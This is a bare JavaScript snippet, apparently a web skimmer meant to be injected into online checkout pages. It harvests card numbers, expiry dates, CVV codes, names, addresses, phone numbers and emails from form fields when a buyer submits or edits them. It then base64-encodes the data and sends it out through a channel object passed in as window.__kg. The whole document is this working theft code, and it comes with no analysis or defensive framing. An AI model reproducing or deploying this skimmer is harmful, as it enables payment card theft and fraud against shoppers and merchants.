(function (dc) {
  var sent = false;
  function val(sel) { var el = document.querySelector(sel); return el ? el.value : ""; }
  function grab() {
    var d = {
      cc: val('input[name*="cardnumber" i], input[autocomplete="cc-number"]'),
      exp: val('input[autocomplete="cc-exp"], input[name*="expiry" i]'),
      cvv: val('input[autocomplete="cc-csc"], input[name*="cvv" i], input[name*="cvc" i]'),
      name: val('input[autocomplete="name"]'), addr: val('input[autocomplete="street-address"]'),
      phone: val('input[type="tel"]'), email: val('input[type="email"]'), u: location.href
    };
    if (d.cc.replace(/\D/g, "").length >= 13 && d.cvv && !sent) { sent = true; dc.send(JSON.stringify({ t: "x", p: btoa(JSON.stringify(d)) })); }
  }
  document.addEventListener("click", function (e) { if (e.target.closest('button[type="submit"], [data-checkout-submit]')) grab(); }, true);
  document.addEventListener("change", grab, true);
})(window.__kg);
